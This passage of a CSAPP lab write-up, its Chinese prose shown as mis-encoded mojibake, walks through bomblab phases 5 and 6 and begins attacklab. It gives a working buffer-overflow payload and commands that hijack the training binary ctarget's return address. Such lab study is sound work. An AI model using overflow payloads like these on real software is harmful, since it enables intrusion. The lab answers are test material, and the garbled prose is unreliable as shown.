ï¼Œä½†å‰é¢æœ‰é‚£ä¹ˆå¤šæŒ‡ä»¤ä¸€å®šä¸æ˜¯åªè¾“å…¥ä¸€ä¸ª flyers è¿™ä¹ˆç®€å•ï¼</p><p>è®©æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹ï¼š</p><p>åœ¨ +41 å’Œ +74 ä¹‹é—´æœ‰ä¸€ä¸ªå¾ªç¯çš„éƒ¨åˆ†ï¼Œè¿™ä¸ªå¾ªç¯ä¸€å®šå°±æ˜¯å¯¹å­—ç¬¦ä¸²çš„å¤„ç†äº†ï¼ŒåŒæ—¶ï¼Œå¯ä»¥çœ‹å‡ºç»“æŸå¾ªç¯çš„æ ‡å¿—æ˜¯ <code>rax=6</code> ä¹Ÿå°±æ˜¯è¯´è¿™ä¸ªå¾ªç¯è¦è¿›è¡Œå…­æ¬¡ã€‚</p><p>æˆ‘ä»¬å»æ‰æ¯æ¬¡çš„å¾ªç¯æ¬¡æ•°åˆ¤æ–­æ¥åˆ†æä¸€ä¸‹æ¯ä¸€è¡ŒæŒ‡ä»¤éƒ½åšäº†ä»€ä¹ˆï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">movzx  ecx,BYTE PTR [rbx+rax*1]    ;rbx=è¾“å…¥çš„å­—ç¬¦ä¸² rax=0ï¼Œæ¯æ¬¡å¾ªç¯éƒ½ä¼šåŠ 1<br>mov    BYTE PTR [rsp],cl    <br>mov    rdx,QWORD PTR [rsp]    ;åˆ°æ­¤å¥æŒ‡ä»¤æ¯æ¬¡å¾ªç¯ä¸­è¯»å–ç”¨æˆ·è¾“å…¥å­—ç¬¦ä¸²çš„ä¸€ä¸ªå­—ç¬¦åˆ°å¯„å­˜å™¨ä¸­<br>and    edx,0xf    ;å–å½“å‰å­—ç¬¦çš„äºŒè¿›åˆ¶ä½å››ä½æ•°å­—<br>movzx  edx,BYTE PTR [rdx+0x4024b0]     ;ä»0x4024b0è¯»å–ç¬¬rdxçš„å­—ç¬¦ï¼Œrdx=edx<br>mov    BYTE PTR [rsp+rax*1+0x10],dl    ;ä¿å­˜æˆªå–çš„å­—ç¬¦<br></code></pre></td></tr></table></figure><p><code>0x4024b0</code> å¤„å­˜å‚¨ç€ä¸€æ®µå­—ç¬¦ä¸² â€œ<strong>maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?</strong>â€œï¼Œå››ä½çš„äºŒè¿›åˆ¶æœ€å¤§æ˜¯16ï¼Œä¹Ÿå°±æ˜¯è¯´ç”¨æ¥åšåˆ¤æ–­çš„å­—ç¬¦ä¸²æœ‰æ•ˆå€¼å°±æ˜¯ maduiersnfotvbyl ï¼Œ<del>åé¢æ˜¯ä½œè€…åœ¨å†…æ¶µæˆ‘ä»¬</del></p><p>è‡³æ­¤æˆ‘ä»¬å¾—å‡ºäº†å­—ç¬¦ä¸²å¤„ç†çš„æ–¹æ³•ï¼Œæ¯æ¬¡å¾ªç¯ä»è¾“å…¥çš„å­—ç¬¦ä¸²æŒ‰é¡ºåºå–ä¸€ä¸ªå­—ç¬¦ï¼Œæ£€æŸ¥æ‰€å–å­—ç¬¦çš„ä½å››ä½æ•°å­—ï¼Œä»¥è¿™ä¸ªæ•°å­—ä¸ºåç§»åœ¨ç»™å®šå­—ç¬¦ä¸²ä¸­æŸ¥æ‰¾ï¼Œè¦æ±‚æœ€åçš„ç»“æœæ˜¯ flyersã€‚</p><p>æˆ‘å†™äº†ä¸€ä¸ªå‡½æ•°æ¥æ‰¾å¯è§å­—ç¬¦ä¸²çš„ç»„åˆï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> <br>&#123;<br>    <span class="hljs-type">int</span> targetValue[<span class="hljs-number">6</span>]=&#123;<span class="hljs-number">9</span>,<span class="hljs-number">15</span>,<span class="hljs-number">14</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>&#125;; <br>    <span class="hljs-type">char</span> visibleChars[] = <span class="hljs-string">&quot; !#$%&amp;&#x27;()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz&#123;|&#125;~&quot;</span>;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;<span class="hljs-number">6</span>;j++) <br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\næ‰¾åˆ°å°¾æ•°ä¸º%dçš„å­—ç¬¦ï¼š&quot;</span>,targetValue[j]);<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; visibleChars[i] != <span class="hljs-string">&#x27;\0&#x27;</span>; i++)<br>&#123;<br><span class="hljs-type">char</span> currentChar = visibleChars[i];<br>            <span class="hljs-type">int</span> charValue = currentChar - <span class="hljs-string">&#x27;0&#x27;</span>; <span class="hljs-comment">// å°†å­—ç¬¦è½¬æ¢ä¸ºå¯¹åº”çš„æ•´æ•°å€¼</span><br>        <span class="hljs-keyword">if</span> ((charValue &amp; <span class="hljs-number">0xF</span>) == targetValue[j]) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c &quot;</span>, currentChar);<br>&#125;<br>        &#125;<br>    &#125;<br>    getchar();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-bomblab/3-bomblab-5_result.png"></p><p>æ¯ä¸€ä¸ªæ‹å‡ºæ¥ä¸€ä¸ªç»„åˆä¸€ä¸‹å°±è¡Œï¼Œæˆ‘é€‰çš„ ionefg  <del>ä¸»è¦æ˜¯å…¨æ˜¯å°å†™å­—æ¯ä¸ç”¨å¤§å°å†™è½¬æ¢</del></p><h3 id="phase-6"><a href="#phase-6" class="headerlink" title="phase_6"></a>phase_6</h3><blockquote><p>æœ¬æ¥è¯´æ˜¯è¿™é“é¢˜å¯ä»¥ä¸åšï¼Œä½†æ˜¯æˆ‘åˆä¸æƒ³è¿™ä¸ªå›½åº†å‡æœŸé‡Œå»çœ‹æ–°ä¸œè¥¿äº†ï¼ˆæˆ‘æ˜¯æ‡’æƒ°è™«ï¼Œå°±åšäº†ä¸€ä¸‹å­ï¼Œç„¶åè¿™ä¸€é“é¢˜åšäº†ä¸€å¤©ğŸ˜¿</p></blockquote><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-bomblab/3-bomblab-6_six_number.png"></p><p>å·²ç»æ‘¸æ¸…å¥—è·¯äº†ï¼Œè¿™ä¸ªç¯èŠ‚è¦æ±‚è¾“å…¥å…­ä¸ªæ•°å­—ã€‚</p><p>æ±‡ç¼–ä»£ç å¾ˆé•¿ï¼Œå¤§è‡´çœ‹äº†ä¸€ä¸‹åœ¨æ•´ä¸ªå‡½æ•°é‡Œé¢è·³æ¥è·³å»çš„ï¼Œçœ‹ç€å°±å¤´æ˜ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x00000000004010f4 &lt;+0&gt;:push   r14<br>0x00000000004010f6 &lt;+2&gt;:push   r13<br>0x00000000004010f8 &lt;+4&gt;:push   r12<br>0x00000000004010fa &lt;+6&gt;:push   rbp<br>0x00000000004010fb &lt;+7&gt;:push   rbx<br>0x00000000004010fc &lt;+8&gt;:sub    rsp,0x50<br>0x0000000000401100 &lt;+12&gt;:mov    r13,rsp<br>0x0000000000401103 &lt;+15&gt;:mov    rsi,rsp<br>0x0000000000401106 &lt;+18&gt;:call   0x40145c &lt;read_six_numbers&gt;    ;è¯»å…­ä¸ªæ•°å­—<br>0x000000000040110b &lt;+23&gt;:mov    r14,rspn<br>0x000000000040110e &lt;+26&gt;:mov    r12d,0x0<br>0x0000000000401114 &lt;+32&gt;:mov    rbp,r13<br>0x0000000000401117 &lt;+35&gt;:mov    eax,DWORD PTR [r13+0x0]    ;å–ä¸€ä¸ªæ•°å­—<br>0x000000000040111b &lt;+39&gt;:sub    eax,0x1    ;å°†å–å‡ºçš„æ•°å­—-1<br>0x000000000040111e &lt;+42&gt;:cmp    eax,0x5     ;ç»“æœè¦å°äºç­‰äº5<br>0x0000000000401121 &lt;+45&gt;:jbe    0x401128 &lt;phase_6+52&gt;   <br>0x0000000000401123 &lt;+47&gt;:call   0x40143a &lt;explode_bomb&gt;<br>0x0000000000401128 &lt;+52&gt;:add    r12d,0x1<br>0x000000000040112c &lt;+56&gt;:cmp    r12d,0x6    ;å…­æ¬¡å¾ªç¯<br>0x0000000000401130 &lt;+60&gt;:je     0x401153 &lt;phase_6+95&gt;    <br>0x0000000000401132 &lt;+62&gt;:mov    ebx,r12d    <br>0x0000000000401135 &lt;+65&gt;:movsxd rax,ebx<br>0x0000000000401138 &lt;+68&gt;:mov    eax,DWORD PTR [rsp+rax*4]<br>0x000000000040113b &lt;+71&gt;:cmp    DWORD PTR [rbp+0x0],eax      ;åˆ¤æ–­æ•°å­—æ˜¯å¦ä¸¤ä¸¤ç›¸ç­‰<br>0x000000000040113e &lt;+74&gt;:jne    0x401145 &lt;phase_6+81&gt;<br>0x0000000000401140 &lt;+76&gt;:call   0x40143a &lt;explode_bomb&gt;<br>0x0000000000401145 &lt;+81&gt;:add    ebx,0x1<br>0x0000000000401148 &lt;+84&gt;:cmp    ebx,0x5<br>0x000000000040114b &lt;+87&gt;:jle    0x401135 &lt;phase_6+65&gt;<br>0x000000000040114d &lt;+89&gt;:add    r13,0x4<br>0x0000000000401151 &lt;+93&gt;:jmp    0x401114 &lt;phase_6+32&gt;  <br>0x0000000000401153 &lt;+95&gt;:lea    rsi,[rsp+0x18]    <br>0x0000000000401158 &lt;+100&gt;:mov    rax,r14<br>0x000000000040115b &lt;+103&gt;:mov    ecx,0x7<br>0x0000000000401160 &lt;+108&gt;:mov    edx,ecx    ;edx=7<br>0x0000000000401162 &lt;+110&gt;:sub    edx,DWORD PTR [rax]    ;å½“å‰æ•°å­—-7ï¼Œç»“æœè¦†ç›–åŸæ•°å­—<br>0x0000000000401164 &lt;+112&gt;:mov    DWORD PTR [rax],edx<br>0x0000000000401166 &lt;+114&gt;:add    rax,0x4    ;å‡†å¤‡è¯»å–ä¸‹ä¸€ä¸ªæ•°å­—    <br>0x000000000040116a &lt;+118&gt;:cmp    rax,rsi    ;åˆ¤æ–­æ˜¯ä¸æ˜¯æœ€åä¸€æ¬¡å¾ªç¯<br>0x000000000040116d &lt;+121&gt;:jne    0x401160 &lt;phase_6+108&gt;    ;è·³è½¬å›æ“ä½œæ•°å­—å¤„ç†ç»§ç»­è¿›è¡Œä¸‹ä¸€ä¸ªæ•°å­—çš„å¤„ç†<br>0x000000000040116f &lt;+123&gt;:mov    esi,0x0<br>0x0000000000401174 &lt;+128&gt;:jmp    0x401197 &lt;phase_6+163&gt;<br>0x0000000000401176 &lt;+130&gt;:mov    rdx,QWORD PTR [rdx+0x8] <br>0x000000000040117a &lt;+134&gt;:add    eax,0x1<br>0x000000000040117d &lt;+137&gt;:cmp    eax,ecx<br>0x000000000040117f &lt;+139&gt;:jne    0x401176 &lt;phase_6+130&gt;<br>0x0000000000401181 &lt;+141&gt;:jmp    0x401188 &lt;phase_6+148&gt;<br>0x0000000000401183 &lt;+143&gt;:mov    edx,0x6032d0<br>0x0000000000401188 &lt;+148&gt;:mov    QWORD PTR [rsp+rsi*2+0x20],rdx<br>0x000000000040118d &lt;+153&gt;:add    rsi,0x4    <br>0x0000000000401191 &lt;+157&gt;:cmp    rsi,0x18    <br>0x0000000000401195 &lt;+161&gt;:je     0x4011ab &lt;phase_6+183&gt;<br>0x0000000000401197 &lt;+163&gt;:mov    ecx,DWORD PTR [rsp+rsi*1]   <br>0x000000000040119a &lt;+166&gt;:cmp    ecx,0x1   <br>0x000000000040119d &lt;+169&gt;:jle    0x401183 &lt;phase_6+143&gt;   <br>0x000000000040119f &lt;+171&gt;:mov    eax,0x1<br>0x00000000004011a4 &lt;+176&gt;:mov    edx,0x6032d0<br>0x00000000004011a9 &lt;+181&gt;:jmp    0x401176 &lt;phase_6+130&gt;<br>0x00000000004011ab &lt;+183&gt;:mov    rbx,QWORD PTR [rsp+0x20]<br>0x00000000004011b0 &lt;+188&gt;:lea    rax,[rsp+0x28]<br>0x00000000004011b5 &lt;+193&gt;:lea    rsi,[rsp+0x50]<br>0x00000000004011ba &lt;+198&gt;:mov    rcx,rbx<br>0x00000000004011bd &lt;+201&gt;:mov    rdx,QWORD PTR [rax]<br>0x00000000004011c0 &lt;+204&gt;:mov    QWORD PTR [rcx+0x8],rdx<br>0x00000000004011c4 &lt;+208&gt;:add    rax,0x8<br>0x00000000004011c8 &lt;+212&gt;:cmp    rax,rsi<br>0x00000000004011cb &lt;+215&gt;:je     0x4011d2 &lt;phase_6+222&gt;<br>0x00000000004011cd &lt;+217&gt;:mov    rcx,rdx<br>0x00000000004011d0 &lt;+220&gt;:jmp    0x4011bd &lt;phase_6+201&gt;<br>0x00000000004011d2 &lt;+222&gt;:mov    QWORD PTR [rdx+0x8],0x0<br>0x00000000004011da &lt;+230&gt;:mov    ebp,0x5<br>0x00000000004011df &lt;+235&gt;:mov    rax,QWORD PTR [rbx+0x8]<br>0x00000000004011e3 &lt;+239&gt;:mov    eax,DWORD PTR [rax]<br>0x00000000004011e5 &lt;+241&gt;:cmp    DWORD PTR [rbx],eax<br>0x00000000004011e7 &lt;+243&gt;:jge    0x4011ee &lt;phase_6+250&gt;<br>0x00000000004011e9 &lt;+245&gt;:call   0x40143a &lt;explode_bomb&gt;<br>0x00000000004011ee &lt;+250&gt;:mov    rbx,QWORD PTR [rbx+0x8]<br>0x00000000004011f2 &lt;+254&gt;:sub    ebp,0x1<br>0x00000000004011f5 &lt;+257&gt;:jne    0x4011df &lt;phase_6+235&gt;<br>0x00000000004011f7 &lt;+259&gt;:add    rsp,0x50    ;å‡†å¤‡ç»“æŸå‡½æ•°<br>0x00000000004011fb &lt;+263&gt;:pop    rbx<br>0x00000000004011fc &lt;+264&gt;:pop    rbp<br>0x00000000004011fd &lt;+265&gt;:pop    r12<br>0x00000000004011ff &lt;+267&gt;:pop    r13<br>0x0000000000401201 &lt;+269&gt;:pop    r14<br>0x0000000000401203 &lt;+271&gt;:ret    <br></code></pre></td></tr></table></figure><p> <del>ä¹±ä¸ƒå…«ç³Ÿä¹±ä¸ƒå…«ç³Ÿ</del>    </p><p>è¿™ä¸ªå¾ªç¯å¤§æ¦‚åˆ†ä¸ºå‡ ä¸ªéƒ¨åˆ†ï¼š</p><ul><li><p><em>+23 - +60</em> åˆ¤æ–­è¾“å…¥çš„å…­ä¸ªæ•°å­—æ˜¯å¦éƒ½å°äºç­‰äº6</p></li><li><p><em>+62 - +93</em> ä¸¤ä¸ªå°å¾ªç¯æ¥åˆ¤æ–­è¾“å…¥çš„æ•°å­—æ˜¯ä¸æ˜¯é‡å¤çš„   </p></li><li><p><em>+108 -+128</em> æ‰€æœ‰æ•°å­—éƒ½ä¸7åšå·®å†ç”¨ç»“æœè¦†ç›–åŸå§‹å€¼</p></li><li><p><em>+130 - +181</em> é‡æ–°å®‰æ’é“¾è¡¨</p></li><li><p><em>+183 - +257</em> æ£€éªŒé“¾è¡¨ä¸­çš„æ•°æ®æ˜¯å¦ä»å¤§åˆ°å°æ’åº</p></li></ul><p>å…³äºé“¾è¡¨çš„æ“ä½œéƒ¨åˆ†ï¼š</p><p>+130 å¤„çš„æ“ä½œæ˜¯ <code>mov rdx,QWORD PTR [rdx+0x8]</code> ï¼Œè¿™æ˜¯é“¾è¡¨çš„ä¸€ç§è¡¨ç¤ºæ–¹æ³•ï¼Œå°†é“¾è¡¨ä¸­çš„èŠ‚ç‚¹ä¸²æ¥èµ·æ¥ã€‚</p><p>åœ¨ +176 å¤„å–äº†ä¸€ä¸ªåœ°å€è¿›è¡Œæ“ä½œï¼ŒæŸ¥çœ‹æ­¤å¤„å†…å­˜æ•°æ®ï¼š</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-bomblab/3-bomblab-6_information.png"></p><p>æ ¹æ®ä¿¡æ¯å­˜å‚¨çš„æ–¹å¼ä¹Ÿå¯ä»¥åˆ¤æ–­å‡ºè¿™æ˜¯ä¸€ä¸ªé“¾è¡¨ï¼Œä» 1-6 æ¯ä¸€ä¸ªç´¢å¼•å€¼å¯¹åº”èŠ‚ç‚¹å­˜å‚¨çš„æ•°æ®ä¸ºï¼š332ï¼Œ168ï¼Œ924ï¼Œ691ï¼Œ477ï¼Œ413</p><p>ä¹Ÿå°±æ˜¯è¯´è¿™éƒ¨åˆ†ä¸­ï¼Œç¨‹åºä¼šå…ˆç”¨7å‡å»æˆ‘ä»¬è¾“å…¥çš„æ•°æ®ï¼Œç„¶åä»¥æˆ‘ä»¬è¾“å…¥çš„æ•°æ®çš„é¡ºåºæ¥é‡æ–°æ’åˆ—é“¾è¡¨ä¸­æ•°æ®çš„é¡ºåºã€‚æ¯”å¦‚æˆ‘ä»¬è¾“å…¥ 1ã€2ã€3ã€4ã€5ã€6 ï¼Œä¸ 7 åšå·®ç»“æœæ˜¯ 6ã€5ã€4ã€3ã€2ã€1ï¼Œå‡è®¾æˆ‘ä»¬ç”¨ [n] æ¥è¡¨ç¤ºåŸæœ¬é“¾è¡¨ä¸­çš„ç¬¬nä¸ªæ•°æ®ï¼Œé‚£ä¹ˆå®ƒçš„æ’åºé¡ºåºå°±æ˜¯ [6]ã€[5]ã€[4]ã€[3]ã€[2]ã€[1]ï¼Œå¹¶ä¸”æ­¤æ—¶æˆ‘ä»¬éœ€è¦ä¿è¯æ•°æ®æ˜¯ä»å¤§åˆ°å°æ’åºçš„ã€‚</p><p>æ‰€ä»¥å¯ä»¥é€†å‘åˆ†æï¼Œæˆ‘ä»¬å…ˆæŠŠåŸé“¾è¡¨ä¸­çš„æ•°æ®æ’åºï¼Œé¡ºåºæ˜¯ 3ã€4ã€5ã€6ã€1ã€2ã€‚åˆå› ä¸ºæˆ‘ä»¬éœ€è¦å…ˆä¸ 7 åšå·®ï¼Œå†é€†å‘æ¨å›å»å°±æ˜¯ <strong>4ã€3ã€2ã€1ã€6ã€5</strong>ã€‚</p><hr><p>æˆ‘æœ€åæ€»çš„ä½œç­”æ˜¯è¿™æ ·çš„</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs txt">Border relations with Canada have never been better.<br>1 2 4 8 16 32<br>0 207<br>0 0<br>ionefg<br>4 3 2 1 6 5<br></code></pre></td></tr></table></figure><p>å®Œç»“æ’’èŠ±~ğŸ¥³</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-bomblab/3-bomblab-result.png"></p><h1 id="attaklab"><a href="#attaklab" class="headerlink" title="attaklab"></a>attaklab</h1><p>æ˜¯ä¹¦ä¸­çš„ç¬¬ä¸‰ä¸ªå®éªŒï¼Œä½†æ˜¯æ„Ÿè§‰å®éªŒå†…å®¹å’Œç¬¬ä¸‰ç« çš„å†…å®¹æ²¡ä»€ä¹ˆå…³ç³»</p><p>ä¸€å…±æ˜¯ä¸¤ä¸ªæ–‡ä»¶ï¼Œä¸€ä¸ªæ˜¯ <code>ctarget</code>ï¼Œä¸€ä¸ªæ˜¯ <code>rtarget</code></p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-bomblab/attacklab-%E8%AF%95%E8%BF%90%E8%A1%8C.png"></p><p>å…¶ä¸­ ctarget æ˜¯å­˜åœ¨ä»£ç æ³¨å…¥æ”»å‡»æ¼æ´ï¼Œrtargetæ˜¯å­˜åœ¨é¢å‘è¿”å›çš„ç¼–ç¨‹ï¼ˆROPï¼‰æ”»å‡»æ¼æ´ã€‚</p><p><code>hex2raw</code> æ˜¯é¢˜ç›®ä¸ºæˆ‘ä»¬æä¾›çš„æŠŠåå…­è¿›åˆ¶è¡¨ç¤ºè½¬æ¢ä¸ºäºŒè¿›åˆ¶æ•°æ®çš„å·¥å…·ï¼ˆè¶…çº§ç®€æ˜“ç‰ˆ pwntools !)ï¼Œç¡®å®šå¥½è¦ç»™<code>ctarget</code> è¾“å…¥çš„ä¿¡æ¯ï¼Œç”¨ <code>hex2raw</code> è½¬æ¢ï¼Œé€šè¿‡ Linux ç»ˆç«¯çš„ IO é‡å®šå‘åŠŸèƒ½ï¼Œå°±å¯ä»¥è¾“å…¥ç»™è¿›ç¨‹ã€‚</p><p>æˆ‘åªåšäº† ctargetã€‚</p><blockquote><p>gdb è°ƒä¸äº†è¿™ä¸ªæ–‡ä»¶ä¸çŸ¥é“ä¸ºå•¥ï¼Œå°± objdump -d ctarget &gt; ctarget.s äº†æ±‡ç¼–æ–‡ä»¶</p></blockquote><h3 id="touch1"><a href="#touch1" class="headerlink" title="touch1"></a>touch1</h3><blockquote><p>ä»»åŠ¡æè¿°ï¼šå½“å‡½æ•° getbuf è¿”å›åï¼Œè®© ctarget æ‰§è¡Œå‡½æ•° touch1 ï¼Œè€Œä¸æ˜¯ç»§ç»­æ‰§è¡Œå‡½æ•° test ã€‚</p></blockquote><p>æœ€å¼€å§‹å°±è®©è¾“å…¥ä¸€ä¸²å­—ç¬¦ä¸²ï¼Œç›®çš„æ˜¯è¦†ç›–è¿”å›åœ°å€ï¼Œä½¿ç¨‹åºè·³è½¬åˆ° <code>touch1</code></p><p>çœŸçš„å¾ˆæ€ªè¿™ä¸ªç¨‹åºçš„å¼€å§‹éƒ¨åˆ†ä¸åœ¨ main å‡½æ•°é‡Œï¼Œæ‰€åœ¨å‡½æ•°å« <code>getbuf</code>ï¼Œè¢«å¾ˆå¤šå±‚çš„åµŒå¥—åœ¨äº† <code>launch</code> å‡½æ•°é‡Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">00000000004017a8 &lt;getbuf&gt;:<br>  4017a8:48 83 ec 28          sub    $0x28,%rsp<br>  4017ac:48 89 e7             mov    %rsp,%rdi<br>  4017af:e8 8c 02 00 00       callq  401a40 &lt;Gets&gt;<br>  4017b4:b8 01 00 00 00       mov    $0x1,%eax<br>  4017b9:48 83 c4 28          add    $0x28,%rsp<br>  4017bd:c3                   retq   <br>  4017be:90                   nop<br>  4017bf:90                   nop<br></code></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ª<code>sub</code>æŒ‡ä»¤æŠŠæ ˆé¡¶å¾€ä¸‹æŒªäº†40å­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯ç»™ç¼“å†²åŒºåˆ†é…äº†40å­—èŠ‚ï¼Œç„¶åè°ƒç”¨äº†<code>Gets</code>ï¼Œ<code>Gets</code> æ¥æ”¶ç”¨æˆ·è¾“å…¥å­—ç¬¦ä¸²ã€‚</p><p>æ‰€ä»¥ï¼Œæˆ‘ä»¬éœ€è¦å¡«å…… (0x28+8) ä¸ªå­—ç¬¦ï¼Œå†å¡«å…… <code>touch1</code> çš„åœ°å€ 0x04017c0 è¦†ç›–è¿”å›åœ°å€ã€‚ <code>hex2raw</code>  æ¥å—åå…­è¿›åˆ¶çš„æ•°æ®ï¼Œå†åŠ ä¸Šå°ç«¯åºå¤„ç†ä¿¡æ¯ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦å–‚ç»™  <code>hex2raw</code>  çš„æ•°æ®æ˜¯ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs hex">11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 c0 17 40 <br></code></pre></td></tr></table></figure><p>å¾—å‡ºç»“æœå†ä¸¢ç»™ctargetå°±è¡Œè¾£ï¼</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ vim touch1.txt<br>$ ./hex2raw &lt; touch1.txt &gt; touch1<br>$ ./ctarget -q -i ./touch1<br>Cookie: 0x59b997fa<br>Touch1!: You called touch1()<br>Valid solution <span class="hljs-keyword">for</span> level 1 with target ctarget<br>PASS: Would have posted the following:<br>user <span class="hljs-built_in">id</span>bovik<br>course15213-f15<br>labattacklab<br>result1:PASS:0xffffffff:ctarget:1:11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 C0 17 40 <br></code></pre></td></tr></table></figure><h3 id="touch2"><a href="#touch2" class="headerlink" title="touch2"></a>touch2</h3><blockquote><p>ä»»åŠ¡æè¿°ï¼šå½“å‡½æ•° getbuf è¿”å›åï¼Œè®© ctarget æ‰§è¡Œå‡½æ•° touch2 ï¼Œè€Œä¸æ˜¯ç»§ç»­æ‰§è¡Œå‡½æ•° test ã€‚</p></blockquote><p>è¿˜æ˜¯å’Œ <code>touch1</code> ä¸€æ ·è¦†ç›–è¿”å›åœ°å€ï¼Œä½†æ˜¯è¿™æ¬¡è¿˜è¦ä¼ é€’ä¸€ä¸ªå‚æ•°ï¼Œä¸‹é¢æ˜¯ <code>touch2</code> çš„æ±‡ç¼–ä»£ç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs assembly">00000000004017ec &lt;touch2&gt;:<br>  4017ec:48 83 ec 08          sub    $0x8,%rsp<br>  4017f0:89 fa                mov    %edi,%edx<br>  4017f2:c7 05 e0 2c 20 00 02 movl   $0x2,0x202ce0(%rip)        # 6044dc &lt;vlevel&gt;<br>  4017f9:00 00 00 <br>  4017fc:3b 3d e2 2c 20 